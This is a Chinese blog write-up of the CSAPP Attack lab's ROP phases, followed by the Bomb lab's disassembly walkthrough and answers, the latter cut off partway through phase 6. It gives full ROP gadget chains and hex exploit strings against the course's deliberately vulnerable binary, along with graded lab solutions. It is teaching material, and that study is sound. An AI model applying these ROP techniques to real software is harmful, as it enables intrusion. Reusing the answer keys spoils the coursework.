在第二部分中，我们要攻击的是rtarget，他的代码内容和第一部分一致，但采用了两种策略来阻止缓冲区溢出攻击\n栈随机化 这段程序分配的栈的位置正每次运行时都是随机的，这就使我们无法确定在哪里插入代码 限制可执行代码区域 也就是存放在栈上的代码不可执行，使得插入的恶意代码无法执行 针对这些防御措施，文档提供了攻击策略，即ROP：面向返回的程序设计，就是在已经存在的程序中找到特定的以ret结尾的指令序列为我们所用，称这样的代码段为gadget，把要用到部分的地址压入栈中，每次ret后又会取出一个新的gadget，于是这样就能形成一个程序链，实现我们的目的。我喜欢将这种攻击方式称作“就地取材，拼凑代码”。\n同时也给出指令编码表\n举个例子：\nrtarget有这样一个函数：\nvoid setval_210(unsigned *p) { *p = 3347663060U; } 它的汇编代码字节级表示为：\n0000000000400f15 \u0026lt;setval_210\u0026gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 查表可知，取其中一部分字节序列 48 89 c7 就表示指令movq %rax, %rdi，这整句指令的地址为0x400f15，于是从0x400f18开始的代码就可以变成下面这样：\nmovq %rax, %rdi ret 这个小片段就可以作为一个gadget为我们所用。\n其它一些可以利用的代码都在文件farm.c中展示了出来\nlevel1 本题的任务和phase2相同，都是要求返回到touch2函数，phase2中用到的注入代码为\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret 由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。\n但是farm中找不到pop到rdi寄存器指令的gadget，所以我们另辟蹊径，先pop到rax中，再mov %rax，%rdi，即\npopq %rax ret ############# mov %rax,%rdi ret 逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们的gadget01 gadget01执行，将cookie弹出，赋值给%rax，然后执行ret，继续弹出返回地址，跳转到gadget2 gadget2执行，将cookie值成功赋值给参数寄存器%rdi，然后执行ret，继续弹出返回地址，跳转到touch2 Solution 首要问题是找到我们需要的gadget\n先用如下指令得到target的汇编代码及字节级表示\nobjdump -d rtarget \u0026gt; rtarget.s 查表知，pop %rax用58表示，于是查找58\n00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq retq 得到指令地址为0x4019ab\nmovq %rax, %rdi表示为48 89 c7，刚好能找到！其中 90 表示“空”，可以忽略\n00000000004019c3 \u0026lt;setval_426\u0026gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 得到指令地址为0x4019c5\n根据上图的栈帧，就能写出输入序列：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 level2 来自官方的劝退哈哈哈，Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\n这道题主要是在rtarget中返回到touch3，看似没有难度\nPhase 3中用到的注入代码为：\nmovq $0x5561dca8, %rdi pushq $0x4018fa ret 其中0x5561dca8是栈中cookie存放的地址。\n在本题中由于栈随机化，不能直接将0x5561dca8地址直接给%rdi，可以利用%rsp的相对偏移量来获取cookie的存放地址，\nmovq $0x30(%rsp), %rdi movq %rsp, %rax movq %rax, %rdi lea (%rdi,%rsi,1),%rax movq %rax, %rdi movl %eax, %edi movl %eax, %edx movl %esp, %eax movl %ecx, %esi pushq $0x4018fa ret 查表，movq %rsp, xxx表示为48 89 xx，查找一下有没有可用的gadget\n0000000000401aab \u0026lt;setval_350\u0026gt;: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq 还真找到了，48 89 e0对应的汇编代码为\nmovq %rsp, %rax 地址为：0x401aad\n根据提示，有一个gadget一定要用上\n00000000004019d6 \u0026lt;add_xy\u0026gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 地址为：0x4019d6\n通过合适的赋值，这段代码就能实现%rsp加上段内偏移地址来确定cookie的位置\n剩下部分流程与Phase 3一致，大体思路如下：\n先取得栈顶指针的位置 取出存在栈中得偏移量的值 通过lea (%rdi,%rsi,1),%rax得到 cookie 的地址 将 cookie 的地址传给%rdi 调用touch 3 由于gadget的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，直接给出代码\n#地址：0x401aad movq %rsp, %rax ret #地址：0x4019a2 movq %rax, %rdi ret #地址：0x4019cc popq %rax ret #地址：0x4019dd movl %eax, %edx ret #地址：0x401a70 movl %edx, %ecx ret #地址：0x401a13 movl %ecx, %esi ret #地址：0x4019d6 lea (%rdi,%rsi,1),%rax ret #地址：0x4019a2 movq %rax, %rdi ret 注意movl %ecx, %esi这条指令对应89 d1，截取下面部分\n0000000000401a6e \u0026lt;setval_167\u0026gt;: 401a6e:\tc7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74:\tc3 按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。\n栈帧讲解 为节省空间，每一行代码都省略了后面的ret，\n逻辑在图上标的很清楚，这里就不再用文字写啦！\n要注意，getbuf执行ret后相当于进行了一次pop操作，test的栈顶指针%rsp=%rsp+0x8，所以cookie相对于此时栈顶指针的偏移量是0x48而不是0x50\nSolution 根据上图的栈帧，写出输入序列：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8573152181181443583.jpg","permalink":"https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/","title":"CSAPP:attack实验"},{"content":"Bomb实验 题目解析 注意：本人所写的注释可能有些错误，有问题还请大家批评指正，注释中*的用法和C语言类似，有些寄存器名称没有带%\n题目只给了一个main函数，我们可以大致看出来，它的模式是从某个地方读取字符串，然后作为参数输入每个关卡phase_，进行验证。具体的情况没有显示，说明我们需要通过某种手段去进行探查：\nobjdump -d bomb \u0026gt; bomb.s 同时看到bomb.c中：\n/* When run with no arguments, the bomb reads its input lines * from standard input. */ if (argc == 1) { infile = stdin; } 说明可以通过文件读取的方式进行读取。\n寄存器说明：\nPhase_1 关键代码\n0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp //将栈指针减少8，也就是入栈 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; /*test指令同逻辑与and运算，但只设置条件码寄存器，不改变目的寄存器的值，test %eax,%eax用于测试寄存器%eax是否为空，由于寄存器%rax一般存放函数的返回值，此处应该存放的是函数 strings_not_equal的值，而%eax是%rax的低32位表示，所以不难分析出，当%eax值为0时，test的两个操作数相同且都为0，条件码ZF置位为1，即可满足下一行代码的跳转指令*/ 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; //当ZF位为0时，跳转到400ef7处 400ef2:\te8 43 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //调用explode-bomb函数，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp //出栈 400efb:\tc3 ret 仅从函数调用的角度来看，phase_1的参数存在1st argument寄存器中：%rdi，然后这个参数作为第一个参数，与0x402400作为第二个参数一起被传入到strings_not_equal中，进行一些判定操作。\n0x402400像一个地址，使用gdb对程序进行debug，设置断点查看``0x402400的值，发现是Border relations with Canada have never been better.`，答案已找到\nPhase_2 关键代码如下：\n0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //入栈，栈指针减少40 400f02:\t48 89 e6 mov %rsp,%rsi //将%rsp赋给%rsi(第二个参数寄存器) 400f05:\te8 52 05 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //将(%rsp)与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; //若相等，则跳转到0x400f30 400f10:\te8 25 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //若不相等，则爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //(%rbx-4)取值后赋给eax寄存器 400f1a:\t01 c0 add %eax,%eax //eax=eax+eax 400f1c:\t39 03 cmp %eax,(%rbx) //比较%eax和(%rbx)的值 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //如果相等，跳转到0x400f25 400f20:\te8 15 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx //rbx寄存器+4 400f29:\t48 39 eb cmp %rbp,%rbx //%rbx与%rbp比较 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //如果不相等，跳转到0x400f17 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; //跳转到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //(%rsp+4)后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp //(%rsp+18)后再赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //跳转到0x40f17 400f3c:\t48 83 c4 28 add $0x28,%rsp //出栈，栈指针增加40 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret 可以看出这个阶段读取六个数字，并通过一个循环将其与对应的值对比，这些对应值的规律就是1 2 4 8 16 32，答案已出。\n（lea 0x18(%rsp),%rbp指令是将%rsp+40传给%rbp，lea指令用于计算有效地址，以及加法和有限的乘法运算，而其余如mov -0x4(%rbx),%eax则是取(%rbx-4)的值再传给%eax）\nPhase_3 关键代码如下：\n0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少24 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //%rsp+12赋给%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //%rsp+8赋给%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //将0x4025cf赋给%esi 第二个参数寄存器 400f56:\tb8 00 00 00 00 mov $0x0,%eax //将0x0赋给%eax 400f5b:\te8 90 fc ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //调用scanf输入函数 400f60:\t83 f8 01 cmp $0x1,%eax //比较返回值和0x1的大小,sscanf的返回值是成功解析和存储的参数数目。 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; //如果大于则跳转到0x400f6a 400f65:\te8 d0 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) //比较0x7和(%rsp+8)值的大小 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //如果 (%rsp+8)\u0026gt;7 跳转到0x400fad即爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //当(%rsp+8)\u0026lt;=7时，将(%rsp+8)的值放入%eax中 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) //跳转到存放在%rax*8+0x402470内存位置上的指令，即%eax*8+0x402470 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax //将0xcf赋给%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; //跳转到0x400fbe 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //比较(%rsp+12)和%eax的值 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; //如果相等，则跳转到0x400fc9 400fc4:\te8 71 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400fc9:\t48 83 c4 18 add $0x18,%rsp //出栈，栈指针增加24 400fcd:\tc3 ret 注意：jg指令是后面的操作数大于前面的操作数，不要弄反了\n首先根据sscanf函数确定有两个参数，刚好%rsp+8和%rsp+12没有赋值，于是推测这两个值对应这两个变量，接着由于sscanf函数返回参数的数目，所以必须输入两个数，并且第一个参数要小于等于7，最后根据下面这条关键指令判断第二个参数取决于第一个参数的值，使用gdb遍历打印相应的跳转地址的值，得到以下列表。\n最关键的指令是：\n400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8)\n(gdb) x/ *0x402470 第一个参数为0，第二个参数为0xcf 0x400f7c \u0026lt;phase_3+57\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/s *0x402478 第一个参数为1，第二个参数为0x137 311 0x400fb9 \u0026lt;phase_3+118\u0026gt;: \u0026#34;\\270\\067\\001\u0026#34; (gdb) x/ *0x402480 第一个参数为2，第二个参数为0x2c3 0x400f83 \u0026lt;phase_3+64\u0026gt;: \u0026#34;\\270\\303\\002\u0026#34; (gdb) x/ *0x402488 第一个参数为3，第二个参数为0x100 0x400f8a \u0026lt;phase_3+71\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x402490 第一个参数为4，第二个参数为0x185 0x400f91 \u0026lt;phase_3+78\u0026gt;: \u0026#34;\\270\\205\\001\u0026#34; (gdb) x/ *0x402498 第一个参数为5，第二个参数为0xce 0x400f98 \u0026lt;phase_3+85\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x4024a0 第一个参数为6，第二个参数为0x2aa 0x400f9f \u0026lt;phase_3+92\u0026gt;: \u0026#34;\\270\\252\\002\u0026#34; (gdb) x/ *0x4024a8 第一个参数为7，第二个参数为0x147 0x400fa6 \u0026lt;phase_3+99\u0026gt;: \u0026#34;\\270G\\001\u0026#34; Phase_4 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少18 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rcx=rsp+12 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rdx=rsp+8 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi //esi=0x4025cf 40101f:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 401024:\te8 c7 fb ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax //比较eax和2 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; //如果不相等，跳转到0x401035即爆炸 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //相等则比较(%rsp+8)的内存值和14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; //如果(%rsp+8)\u0026lt;=14,跳转到0x40103a 401035:\te8 00 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 40103a:\tba 0e 00 00 00 mov $0xe,%edx //edx=14 参数3 40103f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 参数2 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //edi=*(rsp+8) 参数1 401048:\te8 81 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 40104d:\t85 c0 test %eax,%eax //判断返回值是否为0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; //如果不等于0，跳转到401058即爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //比较*(rsp+12)和0 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; //如果相等，跳转到40105d 401058:\te8 dd 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp //出栈 401061:\tc3 ret 很明显要通过此关必须在调用func4后返回0，而且第二个参数要等于0，所以只需通过调整第一个参数的值来使得func4函数返回0\n0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp //入栈 400fd2:\t89 d0 mov %edx,%eax //eax=edx=14 rsi=0 edi=第一个参数 400fd4:\t29 f0 sub %esi,%eax //eax=eax-esi=14 400fd6:\t89 c1 mov %eax,%ecx //ecx=eax=14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecx逻辑右移31位 ecx=0 400fdb:\t01 c8 add %ecx,%eax //eax=eax+ecx=14 400fdd:\td1 f8 sar %eax //eax算数右移一位 eax=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx=rsi+rax=7 400fe2:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //若edi\u0026gt;=ecx 跳转到0x400ff2 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //否则，edx=rcx-1=6 400fe9:\te8 e0 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=0 edx=13 400fee:\t01 c0 add %eax,%eax //eax=eax*2 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 跳转到0x401007 400ff2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 400ff7:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //若ecx\u0026gt;=edi 跳转到0x401007 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //若ecx\u0026lt;edi，esi=rcx+1=8 400ffe:\te8 cb ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=8 edx=14 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=rax+rax+1 不能经过这条指令，edi必须小于等于7 401007:\t48 83 c4 08 add $0x8,%rsp //出栈 40100b:\tc3 ret 首先edi寄存器也就是我们输入的第一个参数必须小于等于7，\nlea 0x1(%rax,%rax,1),%eax这条指令不能执行，一旦执行这条执行，那么eax寄存器就不可能等于0，同时我们观察到两个判断语句都有等于条件，于是我们把第一个参数设置为7，很顺利地使eax寄存器等于0，当然还有其它的可能性，可以一一去试。\n7 0 | Phase_5 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx //保存调用者寄存器 401063:\t48 83 ec 20 sub $0x20,%rsp //入栈，栈指针减少32 401067:\t48 89 fb mov %rdi,%rbx //rbx=rdi 第一个参数 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //将 %fs 段寄存器中偏移地址为 0x28 的内容加载到 %rax 寄存器中。 401071:\t00 00 //%fs 是一个段寄存器，通常用于访问线程本地存储（Thread Local Storage, TLS） 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) //将其放在栈上 *(rsp+24)=rax 401078:\t31 c0 xor %eax,%eax // eax=0 40107a:\te8 9c 02 00 00 call 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //字符串的长度与6比较 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; //若字符串的长度等于6，跳转到0x4010d2 401084:\te8 b1 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } *(rsp+16)=0xb9 *(rsp+17)=0xbf *(rsp+18)=0xbe *(rsp+19)=0xb5 *(rsp+20)=0xb6 *(rsp+21)=0xb7 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) //否则，将字节0x0存入(rsp+22)地址中 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //esi=0x40245e 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi //rdi=rsp+16 *(rsp+16)=0xbb 4010bd:\te8 76 02 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax //判断返回值是否为0 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; //返回值为0，则跳转到0x4010d9 4010c6:\te8 6f 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; //跳转到0x40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax //rax=*(rsp+24) 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax //rax与%fs段寄存器中偏移地址为0x28的内容异或来检查内容是否被修改 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; //如果相等，则跳转到0x4010ee 4010e9:\te8 42 fa ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; //否则调用错误处理历程 4010ee:\t48 83 c4 20 add $0x20,%rsp //出栈，栈指针增加32 4010f2:\t5b pop %rbx 4010f3:\tc3 ret 关键代码：\n40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } 就是要使得所输入的字符串的十六进制取后四位，并作为array数组的下标，让array数组与目标字符串相等。\n目标字符串在0x40245e内存地址中，即0x666c79657273 \u0026ldquo;flyers\u0026rdquo;\narray数组在0x4024b0内存地址中,如下所示。\n(gdb) x/16c 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: 109 \u0026#39;m\u0026#39; 97 \u0026#39;a\u0026#39; 100 \u0026#39;d\u0026#39; 117 \u0026#39;u\u0026#39; 105 \u0026#39;i\u0026#39; 101 \u0026#39;e\u0026#39; 114 \u0026#39;r\u0026#39; 115 \u0026#39;s\u0026#39; 0x4024b8 \u0026lt;array.3449+8\u0026gt;: 110 \u0026#39;n\u0026#39; 102 \u0026#39;f\u0026#39; 111 \u0026#39;o\u0026#39; 116 \u0026#39;t\u0026#39; 118 \u0026#39;v\u0026#39; 98 \u0026#39;b\u0026#39; 121 \u0026#39;y\u0026#39; 108 \u0026#39;l\u0026#39; (gdb) x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 0x4024b9 f 0x4024bf l 0x4024be y 0x4024b5 e 0x4024b6 r 0x4024b7 s array数组的表格如下\narray[i]的i 对应的char input[rax] 0 m 0x*0 1 a 0x*1 2 d 0x*2 3 u 0x*3 4 i 0x*4 5 e 0x*5 6 r 0x*6 7 s 0x*7 8 n 0x*8 9 f 0x*9 a o 0x*a b t 0x*b c v 0x*c d b 0x*d e y 0x*e f l 0x*f 所以输入的字符串只需找到表格中对应flyers字符串的input[rax]任意组合即可，比如ionefg(0x69 0x6f 0x6e 0x65 0x66 0x67)\nPhase_6 00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp //入栈，栈指针减少80 401100:\t49 89 e5 mov %rsp,%r13 //r13=rsp 401103:\t48 89 e6 mov %rsp,%rsi //rsi=rsp 401106:\te8 51 03 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; //读取6个数字 40110b:\t49 89 e6 mov %rsp,%r14 //r14=rsp 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d //r12d=0 401114:\t4c 89 ed mov %r13,%rbp //rbp=r13 rsp rsp+4 401117:\t41 8b 45 00 mov 0x0(%r13),%eax //eax=*(r13) 40111b:\t83 e8 01 sub $0x1,%eax //eax=eax-1 40111e:\t83 f8 05 cmp $0x5,%eax //eax与5比较 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; //若eax\u0026lt;=5，跳转到0x401128 401123:\te8 12 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401128:\t41 83 c4 01 add $0x1,%r12d //r12d=r12d+1=1 2 40112c:\t41 83 fc 06 cmp $0x6,%r12d //r12d与6比较 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; //若r12d=6，则跳转到0x401153 401132:\t44 89 e3 mov %r12d,%ebx //ebx=r12d=1 2 401135:\t48 63 c3 movslq %ebx,%rax //rax=ebx 1 2 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax //eax=*(rsp+rax*4) 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; //若*(rbp)!=*(rsp+rax*4),跳转到0x401145 401140:\te8 f5 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401145:\t83 c3 01 add $0x1,%ebx //ebx++ 2 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; //若ebx\u0026lt;=5,跳转到0x401135 40114d:\t49 83 c5 04 add $0x4,%r13 //r13+=4 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; 